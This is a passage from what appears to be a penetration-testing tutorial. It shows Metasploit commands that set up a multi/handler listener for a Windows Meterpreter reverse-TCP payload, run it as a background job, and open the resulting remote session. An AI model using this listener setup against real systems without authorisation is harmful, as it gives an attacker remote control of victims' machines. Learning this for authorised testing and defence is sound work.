# Phase 10: Setting Up Handlers

Configure listener for incoming connections:

```bash
# Manual handler setup
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# The -j flag runs as background job
msf6 > jobs -l

# When payload executes on target, session opens
[*] Meterpreter session 1 opened

# Interact with session
msf6 > sessions -i 1
```

## Quick Reference